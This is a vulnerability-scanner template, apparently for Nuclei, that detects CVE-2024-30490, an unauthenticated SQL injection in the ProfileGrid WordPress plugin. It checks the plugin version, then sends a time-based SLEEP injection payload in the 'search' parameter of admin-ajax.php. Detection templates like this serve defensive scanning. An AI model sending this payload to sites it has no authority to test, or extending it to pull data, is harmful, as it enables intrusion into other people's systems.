id: CVE-2024-30490

info:
  name: ProfileGrid <= 5.7.8 - Unauthenticated SQL Injection
  author: Shivam Kamboj
  severity: critical
  description: |
    The ProfileGrid â€“ User Profiles, Groups and Communities plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 5.7.8 due to insufficient escaping on the user supplied 'search' parameter and lack of sufficient preparation on the existing SQL query. 
  remediation: Update to ProfileGrid version 5.7.9 or later.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/profilegrid-user-profiles-groups-and-communities/profilegrid-578-unauthenticated-sql-injection
    - https://nvd.nist.gov/vuln/detail/CVE-2024-30490
    - https://wordpress.org/plugins/profilegrid-user-profiles-groups-and-communities/
  metadata:
    verified: true
    max-request: 2
    product: profilegrid-user-profiles-groups-and-communities
    framework: wordpress
    publicwww-query: "/wp-content/plugins/profilegrid-user-profiles-groups-and-communities/"
  tags: time-based-sqli,cve,cve2024,wordpress,wp,wp-plugin,profilegrid,sqli,unauth,vkev,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/profilegrid-user-profiles-groups-and-communities/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "compare_versions(version, '<= 5.7.8')"
          - "contains(body, 'ProfileGrid')"
        condition: and
        internal: true

    extractors:
      - type: regex
        part: body
        name: version
        group: 1
        regex:
          - 'Stable tag: ([0-9.]+)'
        internal: true

  - raw:
      - |
        @timeout: 10s
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=pm_get_all_groups&search=test'+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-&sortby=newest&pagenum=1&view=grid

    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'contains(header, "text/html")'
          - 'status_code == 200'
        condition: and
